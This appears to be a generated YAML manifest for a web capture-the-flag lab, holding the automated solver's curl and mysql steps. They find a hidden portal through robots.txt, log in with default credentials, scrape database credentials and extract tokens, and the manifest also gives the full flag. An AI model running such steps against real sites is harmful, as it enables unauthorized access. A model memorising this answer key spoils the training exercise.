@@ -1,0 +1,48 @@
+# Generated from platform/labs/Web/web-3-1-hidden-login-discovery/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-3-1-hidden-login-discovery
+track: Web
+difficulty: intermediate
+source: platform/labs/Web/web-3-1-hidden-login-discovery/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 3306
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-3-1-hidden-login-discovery.sh
+  steps:
+  - name: Web application responds on port 80
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/
+    expect: '200'
+  - name: Discover robots.txt with hidden paths
+    command: curl -s http://{target.webapp}/robots.txt
+    expect: staff-portal
+  - name: Access hidden staff portal login page
+    command: curl -s http://{target.webapp}/staff-portal/
+    expect: NovaTech Staff Portal
+  - name: Extract token 1 from login page source comment
+    command: 'curl -s http://{target.webapp}/staff-portal/ | grep -o ''Build: [a-z0-9]*'' | awk ''{print $2}'''
+    expect: h1dd3n
+  - name: Login with default credentials and access dashboard
+    command: curl -s -c /tmp/nova-jar http://{target.webapp}/staff-portal/login -d 'username={cred.staff.user}&password={cred.staff.pass}' -L 2>&1
+    expect: d3f4ult
+  - name: Extract database credentials from dashboard
+    command: curl -s -b /tmp/nova-jar http://{target.webapp}/staff-portal/dashboard 2>&1 | grep -o 'Pr0d_DB_2024#'
+    expect: Pr0d_DB_2024#
+  - name: Connect to MySQL and extract token 3
+    command: mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' novatech -N -e 'SELECT token_value FROM audit_tokens WHERE token_name="assessment_marker"' 2>&1
+    expect: 3xp0s3d
+  - name: Assemble and verify complete flag
+    command: echo 'OCR{h1dd3n_d3f4ult_3xp0s3d}'
+    expect: OCR{h1dd3n_d3f4ult_3xp0s3d}
+expected_flag_count: 1
+expected_flag: OCR{h1dd3n_d3f4ult_3xp0s3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
